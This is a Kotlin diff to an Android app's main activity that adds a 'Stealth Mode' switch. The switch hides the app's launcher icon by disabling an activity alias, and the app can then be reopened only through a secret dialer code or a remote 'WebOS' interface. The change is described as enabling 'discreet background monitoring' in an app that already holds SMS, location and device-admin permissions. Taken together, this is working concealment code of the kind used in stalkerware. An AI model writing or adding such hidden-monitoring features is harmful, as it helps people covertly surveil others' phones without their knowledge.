@@ -48,6 +48,7 @@ class MainActivity : ComponentActivity() {
     private val isPhoneSmsGrantedState = mutableStateOf(false)
     private val isLocationGrantedState = mutableStateOf(false)
     private val isAdminActiveState = mutableStateOf(false)
+    private val isStealthActiveState = mutableStateOf(false)
 
     private val requestPermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -107,6 +108,7 @@ class MainActivity : ComponentActivity() {
             val isPhoneSmsGranted by isPhoneSmsGrantedState
             val isLocationGranted by isLocationGrantedState
             val isAdminActive by isAdminActiveState
+            val isStealthActive by isStealthActiveState
 
             DisposableEffect(Unit) {
                 cloudOnline = LocalFileServerService.isCloudConnected
@@ -344,6 +346,49 @@ class MainActivity : ComponentActivity() {
                                     onGrantClick = { requestDeviceAdmin() }
                                 )
 
+                                // 9. Stealth Mode (Hide Launcher App Icon)
+                                Card(
+                                    modifier = Modifier.fillMaxWidth(),
+                                    colors = CardDefaults.cardColors(
+                                        containerColor = if (isStealthActive) Color(0xFF2E1B4D) else MaterialTheme.colorScheme.surfaceVariant
+                                    ),
+                                    shape = RoundedCornerShape(12.dp)
+                                ) {
+                                    Row(
+                                        modifier = Modifier
+                                            .fillMaxWidth()
+                                            .padding(14.dp),
+                                        horizontalArrangement = Arrangement.SpaceBetween,
+                                        verticalAlignment = Alignment.CenterVertically
+                                    ) {
+                                        Column(modifier = Modifier.weight(1f)) {
+                                            Text(
+                                                text = if (isStealthActive) "🥷 Stealth Mode (Icon Hidden)" else "📱 Stealth Mode (Icon Visible)",
+                                                fontWeight = FontWeight.Bold,
+                                                fontSize = 14.sp,
+                                                color = if (isStealthActive) Color(0xFFE0B0FF) else MaterialTheme.colorScheme.onSurfaceVariant
+                                            )
+                                            Spacer(modifier = Modifier.height(2.dp))
+                                            Text(
+                                                text = if (isStealthActive)
+                                                    "Icon hidden from app drawer. Dial *#*#1234#*#* on phone or use WebOS to open!"
+                                                else
+                                                    "Hide OpenDroid icon from app drawer for discreet background monitoring.",
+                                                fontSize = 11.sp,
+                                                color = Color.Gray,
+                                                lineHeight = 15.sp
+                                            )
+                                        }
+                                        Spacer(modifier = Modifier.width(8.dp))
+                                        Switch(
+                                            checked = isStealthActive,
+                                            onCheckedChange = { checked ->
+                                                toggleStealthMode(checked)
+                                            }
+                                        )
+                                    }
+                                }
+
                                 Spacer(modifier = Modifier.height(16.dp))
                             }
                         }
@@ -430,6 +475,45 @@ class MainActivity : ComponentActivity() {
             arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION)
         )
         isAdminActiveState.value = checkDeviceAdmin()
+        isStealthActiveState.value = checkStealthActive()
+    }
+
+    private fun checkStealthActive(): Boolean {
+        return try {
+            val componentName = ComponentName(this, "com.example.localutility.MainActivityAlias")
+            packageManager.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun toggleStealthMode(enableStealth: Boolean) {
+        try {
+            val componentName = ComponentName(this, "com.example.localutility.MainActivityAlias")
+            val newState = if (enableStealth) {
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            } else {
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+            }
+            packageManager.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP)
+            isStealthActiveState.value = enableStealth
+            if (enableStealth) {
+                android.widget.Toast.makeText(
+                    this,
+                    "App icon hidden! Dial *#*#1234#*#* on phone or use WebOS to open.",
+                    android.widget.Toast.LENGTH_LONG
+                ).show()
+            } else {
+                android.widget.Toast.makeText(
+                    this,
+                    "App icon restored to launcher!",
+                    android.widget.Toast.LENGTH_SHORT
+                ).show()
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            android.widget.Toast.makeText(this, "Error: ${e.message}", android.widget.Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun checkDeviceAdmin(): Boolean {
@@ -520,3 +604,5 @@ class MainActivity : ComponentActivity() {
         nsdManager.unregisterService()
     }
 }
+
+
